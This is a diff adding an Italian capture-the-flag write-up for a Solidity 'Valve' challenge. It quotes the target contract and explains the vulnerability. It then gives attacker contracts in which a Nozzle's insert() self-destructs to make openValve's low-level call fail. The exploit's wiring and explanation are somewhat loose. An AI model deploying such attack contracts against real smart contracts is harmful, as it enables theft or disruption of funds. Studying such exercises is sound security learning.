@@ -1,0 +1,180 @@
+Exploit Valve
+
+Exploit Medio
+
+Quello che ci chiede l'esercizio è di "stoppare la macchina che risucchia tutta l'aria".
+
+Andiamo a vedere il contratto per capire di cosa stiamo parlando:
+
+
+
+    bool public open;
+    bool public lastResult;
+
+    function useNozzle(INozzle nozzle) public returns (bool) {
+        try nozzle.insert() returns (bool result) {
+            lastResult = result;
+            return result;
+        } catch {
+            lastResult = false;
+            return false;
+        }
+    }
+
+
+
+    function openValve(INozzle nozzle) external {
+        open = true;
+        (bool success,) = address(this).call(
+            abi.encodeWithSelector(
+                this.useNozzle.selector,
+                nozzle
+                )
+            );
+        require(!success);
+    }
+
+
+Come possiamo vedere, il contratto ha 2 funzioni e 2 variabili.
+
+Lo scopo è quello di riuscire a chiamare la funzione openValve().
+
+Per capire come fare, dobbiamo addentrarci nelle funzioni del contratto:
+
+    function useNozzle(INozzle nozzle) public returns (bool) {
+        try nozzle.insert() returns (bool result) {
+            lastResult = result;
+            return result;
+        } catch {
+            lastResult = false;
+            return false;
+        }
+    }
+
+Questa prima funzione chiama una funzione insert() sull'interfaccia INozzle che passiamo come parametro.
+
+1) Richiama la funzione insert sull'indirizzo passato e se la trova mi restituisce un booleano
+2) Il booleano viene assegnato alla variabile globale lastResult, e verrà emesso.
+
+altrimenti se non trova la .insert()
+
+3) assegna a lastResult il booleano false.
+
+
+
+Andiamo quindi a vedere la seconda funzione:
+
+    function openValve(INozzle nozzle) external {
+        open = true;
+        (bool success,) = address(this).call(
+            abi.encodeWithSelector(
+                this.useNozzle.selector,
+                nozzle
+                )
+            );
+        require(!success);
+    }
+
+
+Questa è la funzione che dobbiamo riuscire a chiamare.
+Vediamo quindi come funziona:
+
+1) Setta la variabile globale open su true
+2) Fà una chiamata di basso livello .call() e poi codifica la funzione useNozzle, passandogli l'address
+del contratto nozzle che diamo come parametro.
+3) Ci richiede che la transazione NON venga eseguita.
+
+
+Piccola riflessione:
+Cosa fa realmente questa funzione?
+
+1) Inizialmente setta la variabile open su true
+2) Crea una chiamata di basso livello .call(), che fa una chiamata alla funzione useNozzle passandogli l'address
+nozzle che diamo noi come parametro.
+3) La funzione useNozzle viene richiamata e il parametro che viene passato è l'address nozzle fornito in
+precedenza
+4) Entriamo quindi nella useNozzle() funzione.
+5) la useNozzle funzione chiama la .insert() funzione sull'address passato e mi restituisce un valore.
+
+
+Ora quello che noi dobbiamo capire è che la cosa per noi importante è riuscire a chiamare la funzione
+openValve().
+
+Sappiamo quindi come funziona tutto, come ragionare per hackerare il contratto?
+Di cosa abbiamo bisogno?
+
+Il concetto che dobbiamo seguire è:
+dobbiamo far si che la chiamata di basso livello .call() non venga eseguita solo cosi possiamo settare
+la variabile globale open su true.
+
+Come possiamo fare?
+
+Non possiamo fare revert con la funzione receive, in quanto non stiamo ricevendo ether, quindi l'unico modo
+per farmi restituire un false dalla chiamata .call() è quello di distruggere il contratto che riceve la chiamata.
+
+Come possiamo fare?
+
+Rivedendo il codice dell'esercizio ci rendiamo conto di dover creare un nuovo contratto, con la funzione insert()
+integrata(Nozzle).
+
+
+Per prima cosa creiamo un nuovo contratto:
+
+
+
+contract AttackValve{
+
+    Valve valve;
+    Nozzle nozzle;
+
+    constructor(address _valve){
+        valve = Valve(_valve);
+    }
+
+    function attack()public{
+        valve.openValve(nozzle);
+    }
+}
+
+
+contract Nozzle is INozzle{
+
+    function insert()external returns(bool){
+        selfdestruct(payable(address(this)));
+    }
+}
+
+
+Come possiamo vedere, il secondo contratto è il nostro Nozzle che integra l'interfaccia INozzle.
+Al suo interno c'è la funzione insert().
+
+
+Il primo contratto invece è AttackValve che useremo per attaccare il contratto principale.
+
+
+Come ragionano questi contratti?
+
+1) Il contratto AttackValve è il principale e semplicemente chiama la funzione openValve()
+passandogli l'address del nostro contratto Nozzle.
+
+2) La funzione openValve() di Valve.sol inizia l'esecuzione
+
+3) L'open variabile è impostata su true
+
+4) Si entra nella chiamata di basso livello .call() che chiama la funzione useNozzle() passandogli il parametro
+del nostro contratto Nozzle .
+
+5) Si entra nella funzione useNozzle() di Valve.sol
+
+6) Viene richiamata la funzione .insert() sul nostro contratto Nozzle
+
+7) Il contratto esplode e la transazione fallisce.
+
+8) Rientriamo nella funzione openVelve() di Valve.sol per finire l'esecuzione della funzione
+
+9) La transazione è fallita e l'ultima require è soddisfatta.
+
+
+
+
+
